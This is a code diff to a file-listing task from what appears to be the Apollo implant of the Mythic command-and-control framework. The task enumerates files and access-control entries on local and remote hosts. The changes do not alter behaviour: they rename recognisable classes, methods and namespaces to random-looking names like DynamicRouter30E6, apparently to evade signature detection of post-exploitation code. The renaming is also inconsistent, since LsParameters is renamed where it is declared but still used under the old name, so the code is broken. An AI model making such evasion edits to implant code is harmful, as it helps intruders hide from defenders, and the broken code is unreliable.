@@ -9,9 +9,9 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
 using System.Security.AccessControl;
@@ -22,11 +22,11 @@ using System.Security.Policy;
 
 namespace Tasks
 {
-    public class ls : Tasking
+    public class DynamicRouter30E6 : Tasking
     {
 
         private static int _chunkSize = 10;
-        private static ACE GetAceInformation(FileSystemAccessRule ace)
+        private static ACE EnhancedExecutor7D17(FileSystemAccessRule ace)
         {
             ACE result = new ACE
             {
@@ -78,7 +78,7 @@ namespace Tasks
             Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
         };
         [DataContract]
-        internal struct LsParameters
+        internal struct FlexibleGatewayD76D
         {
             [DataMember(Name = "host")]
             public string Host;
@@ -87,13 +87,13 @@ namespace Tasks
         }
 
 
-        private class FileDataStream
+        private class IntelligentManagerAF0D
         {
             public ConcurrentQueue<FileInformation> FileQueue = new ConcurrentQueue<FileInformation>();
 
             public event EventHandler FileChunkReached;
 
-            public void Add(FileInformation item)
+            public void FlexibleEngineDC04(FileInformation item)
             {
                 FileQueue.Enqueue(item);
                 if (FileQueue.Count >= _chunkSize)
@@ -118,12 +118,12 @@ namespace Tasks
         {
             MythicTaskResponse resp;
             LsParameters parameters = _jsonSerializer.Deserialize<LsParameters>(_data.Parameters);
-            string host = string.IsNullOrEmpty(parameters.Host) ? "" : parameters.Host;
+            string host = ValidationHelper.IsStringEmpty(parameters.Host) ? "" : parameters.Host;
             host = localhostAliases.Contains(host.ToLower()) ? "" : host;
-            string uncPath = string.IsNullOrEmpty(host) ? parameters.Path : $@"\\{host}\{parameters.Path}";
-            if (string.IsNullOrEmpty(uncPath))
+            string uncPath = ValidationHelper.IsStringEmpty(host) ? parameters.Path : $@"\\{host}\{parameters.Path}";
+            if (ValidationHelper.IsStringEmpty(uncPath))
                 uncPath = ".";
-            if (string.IsNullOrEmpty(host))
+            if (ValidationHelper.IsStringEmpty(host))
             {
                 string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
                 if (cwd.StartsWith("\\\\"))
@@ -151,7 +151,7 @@ namespace Tasks
             };
             try
             {
-                if (ApolloInterop.Utils.PathUtils.TryGetExactPath(uncPath, out uncPath))
+                if (PhantomInterop.Utils.PathUtils.TryGetExactPath(uncPath, out uncPath))
                 {
                     string errorMessage = "";
                     bool bRet = true;
@@ -218,7 +218,7 @@ namespace Tasks
                             results.Name = finfo.Name;
                             results.ParentPath = dinfo.Parent == null
                                 ? ""
-                                : ApolloInterop.Utils.PathUtils.StripPathOfHost(dinfo.Parent.FullName);
+                                : PhantomInterop.Utils.PathUtils.StripPathOfHost(dinfo.Parent.FullName);
                             results.AccessTime = finfo.AccessTime;
                             results.CreationDate = finfo.CreationDate;
                             results.ModifyTime = finfo.ModifyTime;
